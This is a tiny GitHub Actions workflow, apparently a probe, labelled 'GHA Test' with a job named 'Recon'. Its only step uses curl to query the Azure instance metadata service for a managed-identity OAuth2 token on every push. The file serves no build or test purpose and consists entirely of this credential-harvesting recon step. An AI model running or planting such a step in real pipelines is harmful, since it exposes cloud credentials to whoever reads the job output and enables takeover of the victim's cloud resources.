name: GHA Test
on: [push]
jobs: 
  Recon: #Each job can run for 6h max
    runs-on: ubuntu-latest
    steps:
      - run: |     
            curl 'http://169.254.169.254/metadata/identity/oauth2/token' -H Metadata:true -s


            
       
